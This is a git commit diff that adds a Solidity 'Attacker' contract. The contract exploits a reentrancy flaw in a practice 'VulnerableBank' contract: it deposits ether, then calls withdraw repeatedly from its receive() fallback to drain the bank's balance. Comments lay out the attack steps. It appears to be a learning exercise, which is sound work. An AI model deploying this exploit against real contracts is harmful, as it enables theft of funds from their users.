5a8ef42b500ddb2e5d392139ef4e2555dd692ff6
sholto <arjunc96@gmail.com>
2026-04-04 10:59:37 +0530

    Update reenter-2-attacker.sol

--- src/reenter-2-attacker.sol
+++ src/reenter-2-attacker.sol
@@ -2,6 +2,38 @@ pragma solidity ^0.8.20;
 
 import "./reenter-2.sol";
 
+contract Attacker{
+
+    VulnerableBank bank;
+    uint256 public amountAttack;
+
+    constructor(address _bank){
+        bank = VulnerableBank(_bank);
+    }
+
+    function attack() external payable {
+        amountAttack = msg.value; // minimal or max out our balance?
+        /* 1 ether deposit by attacker
+        bank balance has 10000 ether   */
+        bank.deposit{value: amountAttack}();
+        bank.withdraw();
+    }
+
+    receive() external payable{
+        //enter the bank contract and drain all the funds
+        if (address(bank).balance >= amountAttack){
+            bank.withdraw();
+        }
+
+    }
+
+
+}
+
+
+
+
+
 /* Step - 1
 
 Attacker > Call deposit() with minimal ether = 1 ether
@@ -29,5 +61,5 @@ ETh is sent to the caller(msg.sender) via an external call
 Step -
 balance[msg.sender] = 0
 
-
+*/
 
